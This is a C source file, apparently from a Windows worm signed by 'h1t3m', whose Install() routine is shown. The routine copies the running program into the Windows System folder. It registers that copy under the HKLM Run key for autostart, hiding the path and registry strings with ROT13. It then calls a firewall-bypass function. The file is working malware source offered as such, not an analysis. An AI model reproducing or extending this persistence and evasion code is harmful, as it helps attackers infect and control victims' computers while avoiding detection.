#include "include.h"

   /*\______________             ____                      ___________________
  /                /|  ,-,______/    \______/\________    /                   \
 /By: h1t3m       / | /_____   /      \   __  \       \  /                    /
/_____      _____/  | ___  /  /  /\    \ (__) /    ,\  \/                    /
     /     / \      |/ _ \/  /  (__)   /  __  \__  | \    /\                /
     \     \  \_______/ \____\________/   | \____\_|  \__/  \root@h1t3m.org/
	  \_____\                        |____|                  \___________*/

char* tRegname = "Gjbezre";
char* tPath = "P:\\Jvaqbjf\\Flfgrz\\";
char* tExe = "gjbez.rkr";

void Install()
{
	char filename[256], copy_to[256];
	HKEY hReg;
	GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename));
	sprintf(copy_to, "%s%s", r13(tPath), r13(tExe));
	CopyFile(filename, copy_to, 1);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, r13("Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha"), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL);
	RegSetValueEx(hReg, r13(tRegname), 0, REG_SZ, (unsigned char *)copy_to, strlen(copy_to) + 1);
    RegCloseKey(hReg);
	BypassFirewall(copy_to);
}